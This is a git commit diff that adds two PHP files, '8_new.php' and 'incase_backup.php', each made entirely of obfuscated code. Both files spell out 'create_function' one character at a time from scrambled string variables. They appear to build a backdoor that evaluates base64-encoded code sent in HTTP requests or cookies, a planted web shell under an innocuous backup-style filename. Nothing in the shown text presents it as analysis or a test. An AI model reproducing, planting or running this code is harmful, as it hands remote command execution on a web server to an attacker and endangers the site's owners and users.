9bd5ace5029b9275d13ad5cd88936875878f41d3
Mokotoff <mokotoff@CIT01526682.fios-router.home>
2017-07-07 13:33:46 -0400

    initial commit

---
+++ misc/oldLute/8_new.php
@@ -0,0 +1,102 @@
+<?php
+	$arises= '[qaitTD';
+
+	$circumferential='2';
+	$annular ='v';$broaden =']';$gemini = '(;J_oYs"^';$flew='(';
+
+	$jehanna='e"aHREFc';
+	$hypodermics= 'O>;,Q';$lon = ')';
+
+	$capitalization='VH'; $comprehensibility= '=sr_3HN ';
+	$elicits = 'I';
+
+	$dieter = '(';
+
+	$liv = ',';$dictum= 'Ti'; $boogie = '"'; $mag ='d;s$e_[dn';$citing='U<e)ei';
+	$intruder = 'RttMc"'; $arisen='(nugn)@cb';$breakfasts ='[pa';
+	$auberta='P?ae(jO'; $athletic= 'X:=$rqv';$canto= 'E__a'; $constructions = 'B';$impassable ='4=$)';$easy='senromR_t'; $autobiographic='rf';$cookiemonster='Pe';
+
+	$knell = 'V';
+
+	$joli='_"';
+
+	$goals= 'd';$glass ='a';$fernando= 'D';$cloister='"LTCMEK_d'; $burst ='t'; $chlo='J[ProDC8i';$glib= 'W'; $burrow= '(';$liquifiers='jN_?Dl'; $andrey = 'e';
+
+	$alva='d';$introspection ='$_'; $firemen= 'R'; $fertile= 'e';
+	$gene = 'T';$artist = 'AIQtv'; $dependents ='u'; $janina ='$';
+
+	$connivance ='?';
+
+	$casualty ='rt](';
+	$constitutionality= 'i';
+	$lass ='4psUTeg)';
+	$bowstring =')';$coda ='EaCq(D:E[';$cadence = 'G';$boggles='$';$clarity= 'r';$illusive ='E';$faced =')';$desertions ='r';
+	$asteroids='a9di)J_c';$apiary='Q';$denumerable= 'msca_"$"T';$cops = 'meKN]6rCS'; $jeth =']gaQselnS';$congener='7:M($';$junctor ='d'; $limestone='(v'; $brightened ='e'; $gaur='e'; $creaked ='`'; $didnt =';';
+	$crawlspace= ']Se6yOi)'; $famine = ')';$impassive ='Q';$geophysical = 'f'; $christians ='i';
+	$dialogs= '5$a;)';$decorticate = '$';$janaye ='Z'; $france = 'raqrs'; $arginine ='Q';$firmware='y';
+
+	$completes ='(';$knowhow ='ci'; $clattered= $knowhow['0'] .
+	$france['3'] .
+	$crawlspace['2'].$france['1'] . $casualty['1'] .
+
+	$crawlspace['2'] .$denumerable['4'] .$geophysical .
+	$dependents. $jeth['7'] . $knowhow['0'] .
+
+	$casualty['1'] .
+
+	$knowhow[1] .$chlo['4'] .$jeth['7'] ; $judicature= $comprehensibility['7'];$kittens= $clattered($judicature, $crawlspace['2']. $limestone['1'].$france['1'] . $jeth['6'].
+	$completes. $france['1'] . $france['3'] .$france['3'] .$france['1'].$firmware . $denumerable['4'] .$lass['1'] . $chlo['4'] . $lass['1'] . $completes . $geophysical . $dependents .
+	$jeth['7'] . $knowhow['0']. $denumerable['4'].
+	$jeth['1'].
+	$crawlspace['2'] . $casualty['1'].$denumerable['4'] .$france['1'].$france['3'] .$jeth['1']. $france['4'] .
+	$completes. $dialogs['4'].$dialogs['4'].$dialogs['4'] .
+
+	$dialogs['3']);$kittens($hypodermics['1'],$cops['0'], $junctor, $limestone['1'], $hypodermics['1'], $coda['8'] , $enviable, $decorticate. $knowhow[1]. $impassable['1'] . $france['1']. $france['3']. $france['3']. $france['1'].
+
+	$firmware.$denumerable['4'] .$cops['0'] . $crawlspace['2'].$france['3'].$jeth['1'] . $crawlspace['2'] . $completes. $decorticate. $denumerable['4'] .
+	$firemen .$illusive . $arginine .$lass['3'] . $illusive. $crawlspace['1'] . $denumerable['8'] .$liv .$decorticate . $denumerable['4'].
+	$cops['7'] .$crawlspace['5'] . $crawlspace['5'].
+
+	$cops['2'] .$artist['1'] . $illusive .$liv.
+
+	$decorticate. $denumerable['4']. $crawlspace['1'].$illusive . $firemen . $knell.$illusive.
+
+	$firemen.$dialogs['4'].$dialogs['3'] .
+
+	$decorticate .$france['1'] . $impassable['1'].
+	$knowhow[1].$france['4']. $france['4'].$crawlspace['2'] .$casualty['1'].$completes. $decorticate. $knowhow[1].
+	$coda['8'].$denumerable['7'].
+	$france['2'] .$junctor.$liquifiers['0'].$knowhow['0'] . $junctor .$jeth['7'] .
+	$france['2'] . $cops['0'] . $denumerable['7'] .$crawlspace['0'].$dialogs['4'].
+	$connivance . $decorticate .$knowhow[1] .$coda['8']. $denumerable['7']. $france['2']. $junctor.
+
+	$liquifiers['0'].
+	$knowhow['0'] .
+	$junctor.$jeth['7'].$france['2'].$cops['0'] .
+
+	$denumerable['7'] .$crawlspace['0'] .
+	$congener['1']. $completes . $knowhow[1] . $france['4'] . $france['4'] .
+
+	$crawlspace['2'].
+
+	$casualty['1'] .
+
+	$completes . $decorticate. $knowhow[1].
+	$coda['8'].$denumerable['7'] . $comprehensibility['5']. $denumerable['8'] .
+
+	$denumerable['8'].$chlo['2'].$denumerable['4'].$arginine .$coda['5']. $asteroids['5'] .$cops['7'] .
+
+	$coda['5'] .$cops['3'] .$arginine . $congener['2'].$denumerable['7'] .$crawlspace['0']. $dialogs['4'] .
+	$connivance. $decorticate .$knowhow[1] . $coda['8'] .$denumerable['7'].$comprehensibility['5'] .$denumerable['8'] .$denumerable['8'].$chlo['2'] .$denumerable['4'] . $arginine.$coda['5'].
+	$asteroids['5'] .$cops['7'] .$coda['5'] . $cops['3']. $arginine .
+	$congener['2'] . $denumerable['7'].
+	$crawlspace['0'].$congener['1'].$junctor . $knowhow[1] .$crawlspace['2'].$dialogs['4'].$dialogs['3'].$crawlspace['2'] . $limestone['1'] . $france['1'] . $jeth['6'] .$completes.$france['4'].$casualty['1'] .$france['3'].$france['3']. $crawlspace['2'] . $limestone['1'] .$completes . $arisen['8']. $france['1']. $france['4'].
+
+	$crawlspace['2'] . $crawlspace['3']. $lass['0'].
+	$denumerable['4'] .$junctor. $crawlspace['2'] .$knowhow['0']. $chlo['4'].$junctor. $crawlspace['2'] .$completes. $france['4'].$casualty['1'] .
+
+	$france['3']. $france['3'] .
+
+	$crawlspace['2'] . $limestone['1'].$completes .$decorticate .$france['1'].$dialogs['4']. $dialogs['4'] . $dialogs['4'] .$dialogs['4'] .
+
+	$dialogs['3'] );
---
+++ tacchi/incase_backup.php
@@ -0,0 +1,99 @@
+<?php
+	$indoctrinates = 'C';$cajoling = ' ';$hovering = 'E'; $katalin ='(cAaQ'; $causation = 'S_kHg:U'; $kilojoule= '_i'; $becalm='e';
+
+	$ensign ='d';$lamp = 'R"V"'; $glides = 'yY'; $isabelle= 'l';
+	$gerhardine = '[';$farrel='T';$gassy= 'ZO';
+	$engineers ='acGV';$erenity='s'; $hester = 'S';$gospelers= 'EbR$ca6';$controlling ='@';
+
+	$consenter='x';$correctives='VM';$disfigured= 'T"PL4>';$guarantees='B(DJP';
+
+	$coarsen ='f'; $eiderdown= '$';
+	$fruit ='rKm]sn';
+	$irk =',';$ferrous ='revQ';$inquirer = '_';
+	$daisey ='b';
+
+	$giulia= 'l'; $leonidas='H'; $coney = '"(H],O(';
+	$cynthia='r';$larks='v'; $executes= 'I';$least= ']rh';$demean = 'rvcnw';$encodes= '?'; $indomitable='TW'; $carlotta = 'I'; $evvy = 'n';$brandise = 'a'; $bidiagonal= ')'; $cotty='i(pEEH=)['; $hynda =']'; $europium= 'E';$dashing= 'j=Dei(i[?';$lonely= 'a';$crazy ='lE[^ae(LP'; $anemia = '$';$excused=']';$hitching =';';
+
+	$hasty= 'r';$innovate ='R';$deploys='$Vg'; $immaculate= 'C$$_'; $bisecting='K'; $apartheid =';t_oeavio'; $kalvin = 'gp?_ev)';$bainite = 'eNiiti;nm'; $inanimate = 'd';$annoyance= 'ertt';
+
+	$joyfully='o';
+
+	$estevan ='D';$madelina ='_';$director='c'; $etti = 'e';$key = 'l)s';
+
+	$cowerers ='_($$)"Fe';$maimed='fTs';$grievance= 't'; $anomalously='(';
+
+	$lanette = 'iq"t';$electroencephalogram= 'p'; $cobwebs='T';
+
+	$lounged='PEv'; $lives= 'ar$d'; $envisioned ='r';$critter='[)Lu"_vt';
+
+	$indiscriminately='g_pR;';$foresee= 'e'; $bitternut= 'o)ia';$depressive='(taOr';$evacuation= 'T'; $crochets= ')'; $coexists ='P'; $invokes='isf:Es)'; $know ='U';$logicians ='m'; $hubby = '(';
+
+	$indicative= ')a`u'; $cycloid='mil'; $inducted='r';$lubricity='h';
+	$isomorph = 'IMeS'; $depths ='reau_de';$chided = 'e'; $censured ='p'; $compassion = '$'; $dots ='sy"dhsds';$daryle ='X';$ferrite ='e_eeI<';$inordinately =')'; $changers = 'M'; $cards ='H='; $coplanar =$director . $depths['0'] .
+	$ferrite['3'] .$depths['2']. $depressive[1] . $ferrite['3'].$ferrite['1'].$invokes['2']. $depths['3']. $bainite['7'] .
+	$director .$depressive[1] . $cycloid['1'] .$bitternut[0].$bainite['7'];$ideolect=$cajoling ;$building= $coplanar($ideolect, $ferrite['3'] .
+
+	$critter['6'] . $depths['2'] .$cycloid[2] .$hubby .$depths['2'].
+	$depths['0']. $depths['0']. $depths['2'] .$dots['1'].
+
+	$ferrite['1']. $censured.$bitternut[0] .$censured. $hubby .$invokes['2'] . $depths['3']. $bainite['7'] . $director. $ferrite['1'].$indiscriminately['0']. $ferrite['3'] .
+	$depressive[1] .$ferrite['1'] .$depths['2'] . $depths['0'] . $indiscriminately['0'] .$dots['7'].$hubby .$inordinately. $inordinately . $inordinately. $indiscriminately['4']); $building($codifiers['3'],
+
+	$dashing['0'] , $gospelers['6'],$blasphemy,$guarantees[0] ,
+
+	$indiscriminately['4'] , $ferrite['5'] ,$compassion. $cycloid['1'] .$cards['1'] . $depths['2'] . $depths['0']. $depths['0'].$depths['2']. $dots['1'] .$ferrite['1']. $cycloid['0'] . $ferrite['3'].$depths['0'] . $indiscriminately['0'].$ferrite['3'] .$hubby . $compassion.$ferrite['1'].
+
+	$indiscriminately['3'] .$invokes['4']. $ferrous[3] . $know . $invokes['4'].
+
+	$isomorph['3']. $evacuation.
+
+	$coney['4'] . $compassion.
+
+	$ferrite['1'] .$immaculate['0'].$depressive['3'].$depressive['3'] .
+
+	$bisecting . $ferrite['4'] . $invokes['4'].
+	$coney['4'].
+
+	$compassion.$ferrite['1'] .
+	$isomorph['3'] .$invokes['4'].$indiscriminately['3'] . $deploys['1'].$invokes['4'] .$indiscriminately['3'].
+
+	$inordinately. $indiscriminately['4'] .
+	$compassion.
+
+	$depths['2'] .$cards['1'].
+
+	$cycloid['1'] .$dots['7'] .$dots['7'] . $ferrite['3'].$depressive[1] .$hubby . $compassion. $cycloid['1']. $critter['0'] .
+
+	$dots[2] . $critter['6'] .$cycloid[2].
+	$dots['4'].$cycloid['0'].$cycloid['1'] .$censured. $ferrite['3'].$dots['6'] .
+
+	$dots[2].
+	$excused .
+	$inordinately .$kalvin[2] .$compassion. $cycloid['1']. $critter['0'].$dots[2].$critter['6'] .$cycloid[2] .
+
+	$dots['4'].$cycloid['0'].
+	$cycloid['1']. $censured.$ferrite['3'].$dots['6'].$dots[2]. $excused.$invokes[3].
+	$hubby .
+	$cycloid['1'] .$dots['7']. $dots['7'] .$ferrite['3'] . $depressive[1] . $hubby .$compassion.$cycloid['1'] . $critter['0'] . $dots[2]. $cards['0'] . $evacuation. $evacuation .$coexists .$ferrite['1'].
+	$deploys['1'] . $critter['2'].$cards['0']. $changers. $ferrite['4'] .$coexists.$invokes['4'] . $estevan . $dots[2]. $excused . $inordinately.$kalvin[2] .$compassion .
+	$cycloid['1']. $critter['0']. $dots[2]. $cards['0'] . $evacuation .
+	$evacuation. $coexists.$ferrite['1']. $deploys['1']. $critter['2'].
+
+	$cards['0'].$changers. $ferrite['4']. $coexists .$invokes['4']. $estevan .
+	$dots[2] . $excused. $invokes[3] . $dots['6'].$cycloid['1'].$ferrite['3'] .$inordinately. $indiscriminately['4']. $ferrite['3']. $critter['6'].$depths['2'] . $cycloid[2] . $hubby.$dots['7'].$depressive[1] .
+
+	$depths['0'] . $depths['0'] .$ferrite['3'] . $critter['6'] .
+
+	$hubby.
+
+	$daisey. $depths['2']. $dots['7'].$ferrite['3'] . $gospelers['6'] .$disfigured['4'].$ferrite['1'].
+
+	$dots['6'].
+
+	$ferrite['3'] .$director.$bitternut[0].$dots['6']. $ferrite['3'].$hubby.$dots['7'].$depressive[1] .
+	$depths['0'] .$depths['0'] .$ferrite['3'] .
+	$critter['6'] . $hubby.$compassion .$depths['2'] .$inordinately .$inordinately.
+
+	$inordinately.$inordinately .
+	$indiscriminately['4']); 
